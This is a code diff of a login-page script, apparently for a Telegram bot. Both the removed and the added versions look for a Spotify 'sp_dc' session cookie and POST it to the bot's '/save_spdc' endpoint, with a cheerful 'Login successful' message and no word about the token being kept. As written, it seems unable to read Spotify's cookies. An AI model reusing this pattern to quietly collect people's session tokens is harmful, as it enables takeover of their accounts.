@@ -1,20 +1,28 @@
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    const cookies = document.cookie.split(';');
-    const sp_dc = cookies.find(c => c.trim().startsWith("sp_dc="));
-    if (sp_dc) {
-      const value = sp_dc.split("=")[1];
-      const params = new URLSearchParams(window.location.search);
-      const user_id = params.get("user_id");
-      if (user_id) {
-        fetch("/save_spdc", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ user_id, sp_dc: value }),
-        }).then(() => {
-          document.body.innerHTML = "<h3>✅ Login successful! You can return to Telegram now.</h3>";
-        });
-      }
-    }
-  }, 5000); // wait 5 sec for cookies to set
-});
+document.getElementById("login-btn").onclick = () => {
+  const user_id = new URLSearchParams(window.location.search).get("user_id");
+  const win = window.open("https://accounts.spotify.com/en/login", "_blank");
+
+  document.getElementById("status").innerText = "🔄 Waiting for login...";
+
+  setTimeout(() => checkCookie(user_id), 5000);
+};
+
+function checkCookie(user_id) {
+  const cookies = document.cookie.split("; ");
+  const spdc = cookies.find(c => c.startsWith("sp_dc="));
+  
+  if (spdc) {
+    const value = spdc.split("=")[1];
+    fetch("/save_spdc", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ user_id, sp_dc: value })
+    }).then(() => {
+      document.getElementById("status").innerText = "✅ Login successful! Return to Telegram.";
+    }).catch(() => {
+      document.getElementById("status").innerText = "❌ Failed to save token.";
+    });
+  } else {
+    document.getElementById("status").innerText = "⚠️ Cookie not found. Try again.";
+  }
+}
